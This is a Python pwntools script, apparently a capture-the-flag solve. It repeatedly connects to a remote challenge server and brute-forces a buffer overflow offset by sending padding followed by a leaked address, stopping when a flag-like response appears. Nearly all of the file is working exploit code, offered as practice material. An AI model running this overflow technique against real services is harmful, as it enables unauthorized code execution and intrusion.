#!/usr/bin/env python3
from pwn import *
import monkeyhex
import time
import argparse
import re
from functools import partial
import logging

# Run with ipython3 -i solve.py -- DEBUG <one_gadget>

parser = argparse.ArgumentParser()
parser.add_argument("one_gadget", type=partial(int, base=0), nargs=argparse.REMAINDER)
argparse_args = parser.parse_args()

# context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

# default libc path for some dists is /usr/lib/libc.so.6
# lib = ELF('/lib/x86_64-linux-gnu/libc.so.6') if not args.REMOTE else ELF('libc.so.6')
# lib.sym['binsh'] = lib.offset_to_vaddr(lib.data.find(b'/bin/sh'))
# lib.sym['one_gadget'] = argparse_args.one_gadget[0] if argparse_args.one_gadget else 0

def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """
    c
    """ if commands is None else commands
    res = gdb.attach(p, val)
    pause()
    return res


def new_proc(start_gdb=False, val=None):
    """Start a new process with predefined debug operations"""
    env = dict()
    # env['LD_LIBRARY_PATH'] = os.getcwd()
    # patchelf --set-interpreter "$(ls ld-*.so)" none
    # ln -s libc-*.so libc.so.6
    if start_gdb is True:
        attach_gdb(p, val)
    return p

def bnot(n, numbits=context.bits):
    return (1 << numbits) -1 -n

def align(val, align_to):
    return val & bnot(align_to - 1)

def batch(it, sz):
    length = len(it)
    for i in range(0, length, sz):
        yield it[i:i+sz]

read_in = b''

for i in range(128):

    p = remote('0.cloud.chals.io', 30096)
    # do leak / payload gen here

    prompt = p.readuntil(b'>>> \n')

    addr = int(re.findall(b'0x[a-fA-F0-9]+', prompt)[0], 0)

    payload = b'A'*i + p64(addr)
    p.sendline(payload)
    time.sleep(0.5)
    if p.can_recv() is True:
        read_in = p.read()
        print(read_in)
        if read_in.find(b'{') != -1:
            break

    p.close()

# p.send(cyclic(0x200) + b'\n')
# p.interactive()
